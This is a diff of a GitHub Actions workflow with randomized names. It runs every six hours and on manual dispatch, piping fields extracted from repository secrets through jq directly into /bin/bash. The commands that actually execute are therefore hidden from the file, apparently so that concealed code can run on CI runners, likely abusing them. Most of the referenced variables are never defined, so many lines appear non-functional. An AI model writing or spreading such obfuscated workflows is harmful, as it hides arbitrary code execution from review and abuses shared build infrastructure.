@@ -1,23 +1,31 @@
 name: xianghuaguo3451
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
-jobs:  # 10437
+    - cron: '2 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xianghuaguo3451
         env:
-          omu09: ${{ secrets.omu09 }}
+          yc5130: ${{ secrets.yc5130 }}
         run: |
-          echo $omu09 | jq -r .rks6666 | /bin/bash
-          echo $y020 | jq -r .tl5250 | /bin/bash
-          echo $ggmju6725 | jq -r .m49170 | /bin/bash
-          echo $eg6566 | jq -r .dsg17 | /bin/bash
-          echo $vzy31 | jq -r .wmgo557 | /bin/bash
-          echo $e965 | jq -r .j818 | /bin/bash
-          echo $bwgr3 | jq -r .piabz14 | /bin/bash
-          echo $wvem747 | jq -r .unxjo72 | /bin/bash
+          echo $yc5130 | jq -r .ss31 | /bin/bash
+          echo $dhq7 | jq -r .jbfkd8738 | /bin/bash
+          echo $tdabn9884 | jq -r .eznnz7 | /bin/bash
+          echo $p430 | jq -r .ivrjb98119 | /bin/bash
+          echo $x21 | jq -r .f491 | /bin/bash
+          echo $pjeyh330 | jq -r .y28330 | /bin/bash
+          echo $ibn5965 | jq -r .emph432 | /bin/bash
+          echo $aq457 | jq -r .rkjgg90159 | /bin/bash
+          echo $nhjf12 | jq -r .ehhmq28345 | /bin/bash
+          echo $zve32465 | jq -r .tnj2 | /bin/bash
+          echo $ckf76 | jq -r .au8719 | /bin/bash
+          echo $l10208 | jq -r .tt11413 | /bin/bash
+          echo $f183 | jq -r .m96 | /bin/bash
+          echo $lgh1 | jq -r .ybvsh044 | /bin/bash
 
